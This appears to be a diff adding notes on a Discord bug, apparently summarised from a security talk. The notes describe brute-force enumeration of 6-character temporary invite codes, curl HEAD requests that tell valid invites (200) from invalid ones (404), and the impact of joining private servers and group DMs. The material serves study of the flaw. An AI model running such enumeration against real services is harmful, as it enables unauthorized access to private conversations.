@@ -508,7 +508,22 @@ Made around 100 requests per second. Found about 1 valid invite per minute.
 Randomly generate invites rather than bruteforcing the entire keyspace.
 Found that generate codes are used as seeds for future codes.
 Enumerated temporary invites only, 6 characters.
-```
 
+Example: 
+$ curl -i -s -k -X $'HEAD' -H $'Host: discordapp.com' -H $'Accept: /'
+$'https://discordapp.com/api/v6/invite/<lolYES>'
+
+<<< RESPONSE 200
+
+$ curl -i -s -k -X $'HEAD' -H $'Host: discordapp.com' -H $'Accept: /'
+$'https://discordapp.com/api/v6/invite/<lolNoO>'
+
+<<< RESPONSE 404
+```
+## Discord Bug - Impact
+
+Able to join private servers
+
+Able to join private group DMs
 
 Source: https://www.youtube.com/watch?v=ijalD2NkRFg&feature=youtu.be
